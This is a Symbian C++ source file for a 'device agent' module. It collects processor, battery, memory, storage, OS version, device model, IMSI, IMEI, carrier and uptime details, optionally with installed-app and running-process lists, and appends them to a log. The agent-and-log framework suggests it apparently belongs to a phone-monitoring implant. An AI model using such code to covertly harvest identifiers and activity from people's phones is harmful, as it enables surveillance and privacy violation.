/*
 * AgentDevice.cpp
 *
 *  Created on: 10/set/2010
 *      Author: Giovanna
 */


/*
 * Please note that:
 * http://wiki.forum.nokia.com/index.php/KIS000764_-_Incorrect_CPU_information_reported_by_HAL
 * Abstract:
 * The HAL (Hardware Abstraction Layer) API provides information about CPU type, architecture, and clock speed. However, wrong values are reported for most S60 3rd Edition devices. 
 * No known solution. 
 */
#include "Agentdevice.h"
#include "HAL.h"
#include "hal_data.h"
#include <etel3rdparty.h>
#include <SysUtil.h>
#include <apgcli.h>
#include <e32std.h>


CAgentDevice::CAgentDevice() :
	CAbstractAgent(EAgent_Device)
	{
	// No implementation required
	}

CAgentDevice::~CAgentDevice()
	{
	__FLOG(_L("Destructor"));
	delete iPhone;		
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentDevice* CAgentDevice::NewLC(const TDesC8& params)
	{
	CAgentDevice* self = new (ELeave) CAgentDevice();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentDevice* CAgentDevice::NewL(const TDesC8& params)
	{
	CAgentDevice* self = CAgentDevice::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentDevice::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_Device.txt");
	__FLOG(_L("-------------"));
		
	iList = EFalse;
		
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	TUint32 list = 0; 
	Mem::Copy( &list, ptr, 4);
	if (list == 1)
		iList = ETrue;
	
	iPhone = CPhone::NewL();  
	}

void CAgentDevice::StartAgentCmdL()
	{
	__FLOG(_L("StartAgentCmdL()"));
	CreateLogL(LOGTYPE_DEVICE);
	RBuf8 buf(GetInfoBufferL());
	buf.CleanupClosePushL();
	if (buf.Length() > 0)
		{
		// dump the buffer to the file log. 
		AppendLogL(buf);
		}
	CleanupStack::PopAndDestroy(&buf);
	CloseLogL();
	}

void CAgentDevice::StopAgentCmdL()
	{
	__FLOG(_L("StopAgentCmdL()"));
	iPhone->Cancel();		
	//CloseLogL(); // moved to StartAgentCmdL
	}

HBufC8* CAgentDevice::GetInfoBufferL()
	{
	//create buffer	
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);

	TBuf<128> buf;
	_LIT(KNewLine,"\n");
			
	// Processor
	TInt cpu = 0;
	HAL::Get(HAL::ECPU,cpu);
	TBuf<8> cpuBuf;
	switch (cpu){
		case HAL::ECPU_ARM:
			cpuBuf.Copy(_L("ARM"));
			break;
		case HAL::ECPU_MCORE:
			cpuBuf.Copy(_L("MCORE"));
			break;
		case HAL::ECPU_X86:
			cpuBuf.Copy(_L("X86"));
			break;
		default:
			cpuBuf.Copy(_L("Unknown"));
			break;
	}
	_LIT(KFormatProcessor,"Processor: %S\n");
	buf.Zero();
	buf.Format(KFormatProcessor,&cpuBuf);
	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
	 
	// Battery
	_LIT(KFormatBattery,"Battery: %u%%  (on AC line)\n");
	_LIT(KFormatBattery2,"Battery: %u%%  \n");
	TUint chargeLevel=0;
	CTelephony::TBatteryStatus batteryStatus;
	iPhone->GetBatteryInfoSync(chargeLevel, batteryStatus);  
	buf.Zero();
	if((batteryStatus == CTelephony::EBatteryConnectedButExternallyPowered) || (batteryStatus == CTelephony::ENoBatteryConnected))
		{
		buf.Format(KFormatBattery,chargeLevel);
		}
	else
		{
		buf.Format(KFormatBattery2,chargeLevel);
		}
	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
	
	// RAM
	TInt ram = 0;
	HAL::Get(HAL::EMemoryRAM, ram);
	TInt freeRam = 0;
	HAL::Get(HAL::EMemoryRAMFree, freeRam);
	_LIT(KFormatRam,"Memory: %i bytes free / %i bytes total\n");
	buf.Zero();
	buf.Format(KFormatRam,freeRam,ram);
	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());

	// Storage
	_LIT(KFormatStorage,"Disk %c: %S - %Li bytes free / %Li bytes total\n");
	TVolumeInfo volumeInfo;
	//TDriveInfo  driveInfo;
	for (TInt driveNumber=EDriveA; driveNumber<=EDriveZ; driveNumber++)
		{
		// get drive info
		/*
		TInt err = iFs.Drive(driveInfo,driveNumber);
		if (err!=KErrNone) 
			{
			continue;
			}
		*/
		// get volume info
		TInt err = iFs.Volume(volumeInfo,driveNumber);
		if (err!=KErrNone)
			{
			 continue;
			}
		TChar letter;
		iFs.DriveToChar(driveNumber,letter);
		buf.Zero();
		buf.Format(KFormatStorage,(TUint)letter,&volumeInfo.iName,volumeInfo.iFree,volumeInfo.iSize);
		buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
		}
		
	// OS version
	TBuf<KSysUtilVersionTextLength> versionBuf;
	SysUtil::GetSWVersion(versionBuf);
	_LIT(KFormatOsVersion,"\nOS Version: %S \n");
	buf.Zero();
	buf.Format(KFormatOsVersion,&versionBuf);
	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());

	// device
	_LIT(KFormatDevice,"\nDevice: %S (%S)\n");
	TBuf<CTelephony::KPhoneManufacturerIdSize> manufacturer;
	TBuf<CTelephony::KPhoneModelIdSize> model;
	iPhone->GetPhoneIdSync(manufacturer,model);
	buf.Zero();
	buf.Format(KFormatDevice,&model,&manufacturer);
	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
		
	// IMSI
	TBuf<CTelephony::KIMSISize> imsi;
	iPhone->GetImsiSync(imsi);   
	_LIT(KFormatImsi,"IMSI: %S \n");
	buf.Zero();
	buf.Format(KFormatImsi,&imsi);
	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
	
	// IMEI
	TBuf<CTelephony::KPhoneSerialNumberSize> imei;
	iPhone->GetImeiSync(imei);  
	_LIT(KFormatImei,"IMEI: %S \n");
	buf.Zero();
	buf.Format(KFormatImei,&imei);
	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());

	// Carrier
	//TBuf<CTelephony::KNetworkShortNameSize> carrier;
	TBuf<CTelephony::KNetworkLongNameSize> carrier;
	iPhone->GetOperatorNameSync(carrier); 
	_LIT(KFormatCarrier,"Carrier: %S \n");
	buf.Zero();
	buf.Format(KFormatCarrier,&carrier);
	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
	
	// Uptime
	_LIT(KFormatUptime,"Uptime: %i days, %i hours, %i minutes\n");
	TInt ms = User::NTickCount();
	TInt min = (ms/(1000*60))%60;
	TInt hours = (ms/(1000*60*60))%24;
	TInt days = (ms/(1000*60*60*24));
	buf.Zero();
	buf.Format(KFormatUptime,days,hours,min);
	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
		
	if(iList)
		{
		RApaLsSession lsSession;
		TApaAppInfo appInfo;
		TApaAppCapabilityBuf capability;
		//_LIT(KNewLine,"\n");
		// Applications list:
		if( lsSession.Connect() == KErrNone)
			{
			CleanupClosePushL( lsSession );
			lsSession.GetAllApps();
			_LIT(KAppList,"\nApplication List: \n");
			buffer->InsertL(buffer->Size(),KAppList().Ptr(),KAppList().Size());
			while( lsSession.GetNextApp( appInfo ) == KErrNone )
				{
				buffer->InsertL(buffer->Size(), appInfo.iCaption.Ptr(), appInfo.iCaption.Size());
				buffer->InsertL(buffer->Size(),KNewLine().Ptr(),KNewLine().Size());
				}
			CleanupStack::PopAndDestroy(&lsSession);
			}
		// Running processes
		TFullName res;
		TFindProcess proc;
		_LIT(KProcList,"\nProcesses List:\n");
		buffer->InsertL(buffer->Size(),KProcList().Ptr(),KProcList().Size());
		while(proc.Next(res) == KErrNone)
		    {
		      	RProcess ph;
		      	TInt err = ph.Open(proc);
		      	if(err!=KErrNone)
		      		{
					continue;
		      		}
		      	buffer->InsertL(buffer->Size(),ph.Name().Ptr(),ph.Name().Size());
		      	buffer->InsertL(buffer->Size(),KNewLine().Ptr(),KNewLine().Size());
		      	ph.Close();
		    }
		}
	
	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
	}

/*
C-drive: Non-volatile/persistent (survives power off), writable storage for applications and data (files stored by built-in applications, applications you install in "phone memory", messages, images/photos, sound files, etc., that you store in "phone memory")

D-drive: volatile, temporary files for applications, content lost when phone powered off (RAM disk allocated from dynamic RAM)

E-drive: memory card (applications and their data you decide to install/put/store on the memory card).

Z-drive: Non-volatile/non-writable ROM (Read Only Memory), built-in applications, the Symbian OS and Series 60 (S60) software. Can only be written to (updated) through firmware flashing procedure. 
*/
